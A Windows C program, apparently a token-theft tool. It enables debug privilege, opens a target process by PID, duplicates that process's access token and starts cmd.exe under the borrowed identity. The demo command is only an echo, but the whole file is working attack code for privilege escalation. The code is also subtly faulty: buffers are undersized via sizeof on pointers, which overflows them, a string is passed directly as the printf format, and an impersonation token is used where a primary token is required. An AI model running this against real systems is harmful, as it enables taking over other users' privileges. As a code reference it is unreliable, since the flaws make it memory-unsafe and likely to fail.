#include <windows.h>
#include <stdio.h>

void ErrorExit(const char* msg) {
    fprintf(stderr, "%s. Error: %lu\n", msg, GetLastError());
    ExitProcess(1);
}

char *enableDebugPrivilege() {
    HANDLE hToken;
    char *result;
    char *failedProc = "[-] OpenProcessToken error\r\n";
    char *lookupError = "[-] LookupPrivilegeValue error\r\n";
    char *adjustError = "[-] AdjustTokenPrivileges error\r\n";
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        result = malloc(sizeof(failedProc) + 1);
        strcpy(result, failedProc);
        return result;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        result = malloc(sizeof(lookupError) + 1);
        strcpy(result, lookupError);
        return result;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        result = malloc(sizeof(adjustError) + 1);
        strcpy(result, adjustError);
        return result;
    }
    CloseHandle(hToken);
    
    char *goodProc = "[+] Local process token opened.\r\n";
    char *goodLookup = "[+] Privilege list recived.\r\n";
    char *goodAdjust = "[+] Debug privilege enable.\r\n";
    int len = strlen(goodProc) + strlen(goodLookup) + strlen(goodAdjust);
    int size = len * sizeof(char);
    result = malloc(size + 1);
    strcpy(result, goodProc);
    strcat(result, goodLookup);
    strcat(result, goodAdjust);
    return result;
}

void SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnable) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
        ErrorExit("Failed to look up privilege");
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        ErrorExit("Failed to adjust token privileges");
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }
    
    char *enable = enableDebugPrivilege();
    printf(enable);
    DWORD pid = (DWORD)atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        ErrorExit("Failed to open process");
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        ErrorExit("Failed to open process token");
    }

    HANDLE hImpersonatedToken;
    if (!DuplicateTokenEx(hToken, 
                          TOKEN_ALL_ACCESS, 
                          NULL, 
                          SecurityImpersonation, 
                          TokenImpersonation, 
                          &hImpersonatedToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        ErrorExit("Failed to duplicate token");
    }

    // Clean up the original handles as they are no longer needed
    CloseHandle(hToken);
    CloseHandle(hProcess);

    // Prepare to create a new process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    // Create the process as the impersonated user
    if (!CreateProcessAsUser(hImpersonatedToken, 
                              NULL, 
                              "cmd.exe /c echo Hello from the impersonated user!", 
                              NULL, 
                              NULL, 
                              FALSE, 
                              CREATE_NEW_CONSOLE, 
                              NULL, 
                              NULL, 
                              &si, 
                              &pi)) {
        CloseHandle(hImpersonatedToken);
        ErrorExit("Failed to create process as user");
    }

    // Wait until the new process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hImpersonatedToken);

    printf("Command executed successfully.\n");

    return 0;
}
